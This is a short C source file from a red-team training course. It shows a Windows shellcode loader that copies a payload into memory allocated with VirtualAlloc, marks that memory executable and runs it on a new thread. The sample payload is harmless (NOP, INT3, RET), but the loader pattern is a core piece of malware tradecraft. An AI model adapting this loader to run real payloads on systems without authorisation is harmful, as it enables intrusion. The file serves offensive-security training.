/*

 Red Team Operator course code template
 storing payload in .data section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 4 byte payload
unsigned char payload[] = {
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
};
unsigned int payload_len = 4;

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
